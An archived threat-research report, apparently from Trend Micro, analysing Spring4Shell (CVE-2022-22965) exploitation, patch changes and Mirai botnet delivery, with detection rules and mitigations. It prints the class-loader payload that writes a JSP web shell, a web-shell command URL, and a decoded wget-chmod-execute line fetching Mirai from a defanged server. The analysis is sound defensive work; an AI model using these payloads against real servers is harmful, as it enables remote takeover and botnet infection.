{
    "id": "ba4e19c1-d9c6-4721-9c82-ee8419ac320f",
    "created_at": "2023-01-12T15:07:00.883667Z",
    "updated_at": "2025-03-27T02:05:59.666058Z",
    "deleted_at": null,
    "sha1_hash": "96bdb21573c560c40aaaace87c7b99ca26be632f",
    "title": "2022-04-08 - CVE-2022-22965- Analyzing the Exploitation of Spring4Shell Vulnerability in Weaponizing and Executing the Mirai Botnet Malware",
    "authors": "",
    "file_creation_date": "2022-05-28T17:29:53Z",
    "file_modification_date": "2022-05-28T17:29:53Z",
    "file_size": 1231304,
    "plain_text": "# CVE-2022-22965: Analyzing the Exploitation of Spring4Shell Vulnerability in Weaponizing and Executing the Mirai Botnet Malware\n\n**[trendmicro.com/en_us/research/22/d/cve-2022-22965-analyzing-the-exploitation-of-spring4shell-vulner.html](https://www.trendmicro.com/en_us/research/22/d/cve-2022-22965-analyzing-the-exploitation-of-spring4shell-vulner.html)**\n\nApril 8, 2022\n\nFigure 1. Logic to prevent\n\nchild properties; this logic is not foolproof.\n[Trend Micro Threat Research observed active exploitation of the Spring4Shell vulnerability assigned as CVE-](https://success.trendmicro.com/dcx/s/solution/000290730?language=en_US)\n[2022-22965, which allows malicious actors to weaponize and execute the Mirai botnet malware. The](https://en.wikipedia.org/wiki/Mirai_(malware))\nexploitation allows threat actors to download the Mirai sample to the “/tmp” folder and execute them after\npermission change using “chmod”.\n\nWe began seeing malicious activities at the start of April 2022. We also found the malware file server with other\nvariants of the sample for different CPU architectures.\n\nWe discuss our findings and analysis of the exploits and patch based on our samples, as well as real-world\napplication of the potential risks in this blog. In the last section, we include some recommendations on how to\nmitigate these risks.\n\n**What is Spring Framework?**\n\n[Spring Framework is used to develop enterprise-level applications in Java. It is a platform that provides](https://spring.io/projects/spring-framework)\ncomprehensive infrastructure to support model-view-controller- or MVC-based applications developed to reduce\nmanual configuration and enhance memory management. It also makes code more reusable and easier to\nmaintain by implementing some design patterns universally.\n\nSpring Framework is part of the Spring ecosystem, which comprises other components for cloud, data, and\nsecurity, among others.\n\n**How is CVE-2022-22965 different from CVE-2022-22963?**\n\nThere are two vulnerabilities that allow malicious actors to achieve remote code execution (RCE) for Spring\nFramework. Table 1 outlines the key differences between the two:\n\n**CVE-2022-22963** **CVE-2022-22965**\n\n\nSpecific to a local resource exposure bug in Spring Cloud\nFunction\n\n\nLeads to RCE in Spring Core applications\nunder non-default circumstances\n\n\nPatch available: Yes. Patch available: Yes (see section on\navailable patches and mitigations).\n\n\nCVSS Base score: 9.8 (Critical) (CVSS 3.x) but much less\nsevere than CVE-2022-22965\n\nMakes an impact on Spring Cloud Function versions 3.1.6,\n3.2.2, and older unsupported versions, where the routing\nfunctionality is used.\n\n\nCVSS Base score: 9.8 (Critical) (CVSS 3.x)\n\nMakes an impact on any Java application\nusing Spring Core under non-default\ncircumstances.\n\n\nTable 1. Differences between CVE-2022-22963 and CVE-2022-22965\n\n\n-----\n\n**Dependencies, software, and versions affected**\n\nAs of this writing, most of the vulnerable setups were configured to the following dependencies:\n\nSpring Framework versions before 5.2.20, 5.3.18, and Java Development Kit (JDK) version 9 or higher\nApache Tomcat\nSpring-webmvc or spring-webflux dependency\nUsing Spring parameter binding that is configured to use a non-basic parameter type, such as Plain Old\nJava Objects (POJOs)\nDeployable, packaged as a web application archive (WAR)\nWritable file system such as web apps or ROOT\n\n**How does the vulnerability exist?**\n\nIn general, this vulnerability occurs when special objects or classes are exposed under certain conditions. It is\nquite common for request parameters to be bound to a POJO that is not annotated with @RequestBody, which\nhelps in extracting parameters from HTTP requests. The class variable contains a reference to the POJO object\nthat the HTTP parameters are mapped to.\n\nThreat actors can directly access an object by specifying the class variable in their requests. All child properties\nof an object can also be accessed by malicious actors through the class objects. As a result, they can get\naccess to all kinds of other valuable objects on the system simply by following the chains of properties.\n\nIn Spring Core for \"class.classLoader\" and \"class.protectionDomain\", logic prevents malicious access to the\nchild properties of the class object. However, the logic is not foolproof and can in fact be bypassed by using the\n\"class.module.classLoader\" selector.\n\n**Patch analysis**\n\nThe patch for Spring Framework has already been released. We provide relevant details in the succeeding\nsection onavailable patches and mitigations.\n\nIn this section, we analyze how different the patch is.\n\nAs aforementioned, the \"class.classLoader\" and \"class.protectionDomain\" logic was not adequately secure, thus\nrendering the Spring Framework vulnerable. To resolve this issue, the logic of child property access has been\nimproved in the patched version update. Currently, it only allows \"name\" variants of class properties and no\nlonger allows the binding of ClassLoader and ProtectionDomain Types.\n\nFigure 2.\n\nspring-framework-5.3.17\n\nFigure 3.\n\nspring-framework-5.3.18\n[Details of the patch can be found here.](https://github.com/spring-projects/spring-framework/commit/002546b3e4b8d791ea6acccb81eb3168f51abb15?diff=unified)\n\n**Exploit analysis**\n\n\n-----\n\nIn this section, we attempt to understand how malicious actors can gain access to all sorts of valuable objects\non the system by simply following the chain of properties that we previously discussed.\n\nHaving access to the class variable and all its sub-properties provides a path for threat actors to change the\nbehavior of the web application. Their familiarity with ways to exploit exposed class objects has resulted in many\ntechniques for weaponizing this vulnerability.\n\nFor example, threat actors can access an AccessLogValve object and weaponize the class variable\n\"class.module.classLoader.resources.context.parent.pipeline.firstpath\" in Apache Tomcat. They can do this by\nredirecting the access log to write a web shell into the web root through manipulation of the properties of the\nAccessLogValve object, such as its pattern, suffix, directory, and prefix.\n\nTo illustrate:\n\n**Stage 1**\n\nSend Crafted Packet using “burp suite” or “curl”\n\nSample Host = (http://{victim IP}:8080/)\n\nFigure 4. Specific headers and class attributes for the creation of a JSP web shell\nThe payload from the first stage can be sent as a single request without using different headers as shown in\n[Figure 4 and as described in this public exploit. This exploit proof of concept is also interesting since a legitimate](https://github.com/jbaines-r7/spring4shell_vulnapp)\nTomcat feature of formatting the incoming logs to a deployed application is exploited as described in the second\nstage.\n\n**Stage 2**\n\nAfter decoding the payload being used from the first stage, we observe the following parameters and values in\nthe payload:\n\nclass.module.classLoader.resources.context.parent.pipeline.first.pattern=%{c2}i\nif(\"j\".equals(request.getParameter(\"pwd\"))){ java.io.InputStream in = %\n{c1}i.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream(); int a = -1; byte[] b = new byte[2048];\nwhile((a=in.read(b))!=-1){ out.println(new String(b)); } } %{suffix}i\n\n\n-----\n\nclass.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp\n\nclass.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT\n\nclass.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar\n\nclass.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=\n\nWhen a server handles this request, it creates a “tomcatwar.jsp” file on the server directory, which can be\nobserved in the following string from the request made in the first stage.\n\nHere, five specific [attributes are modified as follows:](https://tomcat.apache.org/tomcat-8.5-doc/config/valve.html)\n\n_1. Pattern: It consists of a formatting layout identifying the various fields to extract from the request and log the_\nresponse. Here you can see how the headers ‘c2’, ‘c1’, ‘suffix’ are being fetched from the headers. The\nsubstitution happens from the incoming headers as the format is %{name_of_header}i.\n\nclass.module.classLoader.resources.context.parent.pipeline.first.pattern=%{c2}i\nif(\"j\".equals(request.getParameter(\"pwd\"))){ java.io.InputStream in = %\n{c1}i.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream(); int a = -1; byte[] b = new byte[2048];\nwhile((a=in.read(b))!=-1){ out.println(new String(b)); } } %{suffix}i\n\n_2. Suffix: The suffix to add to the end of each log file name. The extension of the file that will be written is .jsp_\n\nclass.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp\n\n_3. Directory: The absolute or relative path of a directory where the file will be created. In this case,_\n‘webapps/ROOT’ is selected since this is the path that is contained in a default Tomcat installation.\n\nclass.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT\n\n_4. Prefix: The string that is added to the start of each log file that will be created. In this case, it’s ‘tomcatwar’._\n\nclass.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar\n\n_5. fileDateFormat: The field allows for a customized timestamp to be added in the log file name. This is kept_\nempty since we don’t want any other extensions in the JSP webshell and this is set to empty because we don’t\ndesire the default timestamp format.\n\nclass.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=\n\n**Stage 3**\n\nUsing the uploaded JSP web shell, malicious actors can execute commands on the server remotely, as\nobserved in this domain:\n\n   -   (http://{victim IP}:8080/tomcatwar[.]jsp?pwd=j&cmd=whoami)\n\nFigure 5. Execution of “whoami” using\n\nuploaded JSP web shell\n\n\n-----\n\n**Associated risks if unpatched**\n\nThe RCE vulnerability gives threat actors full access to the compromised devices, making it a dangerous and\ncritical vulnerability. Malicious actors can achieve various goals through RCE attacks. In contrast to other\nexploits, an RCE attack typically results in the following:\n\nCreation of a path to allow initial access to a device that lets threat actors to install malware or achieve\nother goals\nProvision of means to spread malware that extracts and exfiltrates data from a device, or enabling of\ncommands that install malware designed to steal information\nDenial of servicethat disrupts the operation of systems or other applications on the system\nDeployment and execution of cryptomining or cryptojacking malware on exposed devices by exploiting the\nRCE vulnerability\nDeployment of ransomware that encrypts files and withholds access until victims settle the ransom\n\n**Earliest exploitation**\n\nC1WS IPS rule 1006015, which detects “class.classLoader” in the request, was first logged on our honeypots\non March 31, 2022.\n\nIPS rule: 1006015 – Restrict Apache Struts “class.classLoader” Request\n\n\n-----\n\nFigure 6. C1WS IPS trigger\nWe also observed IPS triggers from the rule released recently, as follows:\n\nIPS rule: 1011372 - Spring Framework \"Spring4Shell\" Remote Code Execution Vulnerability (CVE-2022-22965)\n\nFigure 7. C1WS IPS\n\ntrigger\nThis IPS trigger is observed when a threat actor sends the malicious payload to exploit the vulnerability.\n\n\n-----\n\nFigure 8. C1WS Log Inspection trigger on unsuccessful exploitation\nThis Log Inspection trigger can be observed when there is an unsuccessful exploitation attempt. It fails to create\nthe log file that is the web shell (shell.jsp) due to incoherent permissions on the Tomcat ROOT directory. Such\nindicators can help threat analysts when they explore possible exploitation attempts of this vulnerability.\n\n\n-----\n\nFigure 9. C1WS Log Inspection trigger on unsuccessful exploitation\nLike the trigger in Figure 8, this Log Inspection trigger was observed as a result of an unsuccessful exploitation\nof the vulnerability. Here, the file “shell.jsp” was not created. Since the file was not available, the exception\n“java.io.FileNotFoundException” was logged.\n\n**Active exploitation**\n\nWe observed active exploitation of Spring4Shell wherein malicious actors were able to weaponize and execute\nthe Mirai botnet malware on vulnerable servers, specifically in the Singapore region.\n\nThe Mirai sample is downloaded to the “/tmp” folder and executed after permission change to make them\nexecutable using “chmod”. The exploitation requests and commands decoded are as follows:\n\nhttp://{victim IP}:9090/tomcatwar[.]jsp?\npwd=j&cmd=cd%20/tmp;%20wget%20http://45[.]95[.]169[.]143/The420smokeplace[.]dns/KKveTTgaAAsecNN\naaaa.x86;chmod%20777%20*;./KKveTTgaAAsecNNaaaa.x86%20mSpring[.]x86\ncd /tmp; wget http://45[.]95[.]169[.]143/The420smokeplace.dns/KKveTTgaAAsecNNaaaa.x86;chmod 777\n*;./KKveTTgaAAsecNNaaaa.x86 mSpring[.]x86\nhttp://45[.]95[.]169[.]143/The420smokeplace[.]dns/KKveTTgaAAsecNNaaaa.x86\n\nWe observed the samples at the start of April 2022. We also found the malware file server with other variants for\ndifferent CPU architectures.\n\n\n-----\n\nFigure 10. Mirai\n\nmalware samples for different CPU architectures\n\nFigure 11. Content of “wget.sh” as retrieved from a malicious server\nThe script \"wget.sh\" downloads the binaries from the malicious server and executes all the samples. The\ncompatible ones run while the rest don’t. Post execution, the files are removed from disk.\n\nTrend Micro Vision One™\n\nFigure 12. Trend Micro Vision One™ (Observed Attack Techniques) OATs triggers\n\n\n-----\n\nHere, we see the individual triggers from different modules and products of Trend Micro from the threat hunting\napp, where we can examine the different levels of severity of each significant hit. We take this to the next level\nin the Vision One Workbench.\n\nFigure 13. Trend Micro\n\nVision One™ Network Security Workbench trigger\nThis Workbench is generated from Trend Micro Cloud One™ – Network Security. This shows how Network\nSecurity can help detect and prevent exploit attempts to protect an enterprise’s Cloud workload on its deployed\nvirtual private cloud (VPC). Here we can see how the endpoint with the IP address “10.10.10.176” is protected\nby the Intrusion Prevention Filter for Spring Core Code Execution Vulnerability.\n\n\n-----\n\nFigure 14. Trend Micro Vision One Workbench trigger for Spring Cloud or core vulnerability exploitation\nThis Workbench shows the simplification of a complex attack pattern. Here, we see the initial IPS trigger from\nNetwork Security where a VPC with a vulnerable EC2 instance is protected. With this Workbench, we can see\nthat Trend Micro Cloud One™ – Workload Security and Network Security are working in resonance.\n\nWe also have the IPS trigger from Network Security detecting the exploit attempt right from the start. We can\nthen observe the “Identified Suspicious Command Injection\" IPS rule from Workload Security sending the trigger\nout. Afterward, we see the execution of other commands, and this enables threat analysts to determine the\npresence of a successful exploitation, as the execution was followed using “curl” or “wget” to download and\nexecute a malicious sample after a change of permissions using “chmod”.\n\nThe impact scope helps assess the other workloads that have been observed with similar exploitation indicators\nsuch as processes, files, network activity, and commands executed among others. This integrated view shows\nthe power of having everything in a single screen with detection across multiple products.\n\n\n-----\n\nFigure 15. Trend Micro Vision One Workbench trigger for RCE or malware dropped by exploiting critical server\nvulnerability\nThis Workbench allows the observation of IPS triggers from Workload Security. The observation, in turn,\nenables the monitoring of Command Injection traffic, followed by the Spring Core RCE IPS rule. The different\narrows show the directions of correlation between IP addresses and endpoints.\n\n\n-----\n\nFigure 16. Trend Micro Vision One Workbench trigger for observed vulnerability exploitation and outbound\nconnection to cryptocurrency mining pool\nIn this Workbench trigger, we can observe the work of different Workload Security modules. We can also see\nthe first IPS trigger. Immediately after that, we see that there is an outbound connection to a well-known\ncryptocurrency mining pool. This event is detected from the Activity Monitoring module, which helps log file,\nnetwork, and process activity.\n\nVision One Workbench can help analysts weed out the noise from their environments. With the help of Trend\nMicro threat experts who establish and devise these rules carefully, enterprises can thwart a wide range of\ncyberattacks.\n\n**Available patches and mitigations**\n\n[Spring has released patches for this vulnerability with complete details here.](https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement)\n\nWe urge enterprises to do the following:\n\nUpgrade Spring Framework to versions 5.3.18+ and 5.2.20+.\nUpgrade Spring Boot to versions 2.6.6+ and2.5.12+.\n\nIn the interim, enterprises can mitigate the risks associated with the vulnerability by doing the following:\n\nMaintaining a disallow or blocklist in web application firewall to block strings that contain values such as\n\"class.*\", \"Class.*\", \"*.class.*\", and \"*.Class.*\"\nDowngrading to a lower JDK version such as version 8 might help. However, it could impact application\nfeatures and open doors to other attacks mitigated in higher versions of JDK.\n\n**Trend Micro protection and investigation**\n\n\n-----\n\nTrend Micro has also released rules and filters for detection and protection across some of its suite of products.\nThese provide additional protection from and detection of malicious components associated to this threat.\n\n**Workload Security and Deep Security IPS Rules**\n\n**Rule 1011372 - Spring Framework \"Spring4Shell\" Remote Code Execution Vulnerability (CVE-2022-**\n22965)\n\n**Network Security and TippingPoint Filters**\n\n**Filter 41108: HTTP: Spring Core Code Execution Vulnerability**\n\n**Trend Micro™ Deep Discovery™ Inspector Network Content Inspection Rules**\n\n**Rule 4678: CVE-2022-22965 – SPRING RCE EXPLOIT – HTTP(REQUEST)**\n**Rule 4679: POSSIBLE JAVA CLASSLOADER RCE EXPLOIT – HTTP(REQUEST)**\n\n**Indicators of Compromise (IOCs)**\n\nA list of the IOCs can be found in [this text file..](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/22/d/spring4shell/IOCs-Spring4Shell.txt)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-04-08 - CVE-2022-22965- Analyzing the Exploitation of Spring4Shell Vulnerability in Weaponizing and Executing the Mirai Botnet Malware.pdf"
    ],
    "report_names": [
        "2022-04-08 - CVE-2022-22965- Analyzing the Exploitation of Spring4Shell Vulnerability in Weaponizing and Executing the Mirai Botnet Malware.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536020,
    "ts_updated_at": 1743041159,
    "ts_creation_date": 1653758993,
    "ts_modification_date": 1653758993,
    "files": {
        "pdf": "https://archive.orkl.eu/96bdb21573c560c40aaaace87c7b99ca26be632f.pdf",
        "text": "https://archive.orkl.eu/96bdb21573c560c40aaaace87c7b99ca26be632f.txt",
        "img": "https://archive.orkl.eu/96bdb21573c560c40aaaace87c7b99ca26be632f.jpg"
    }
}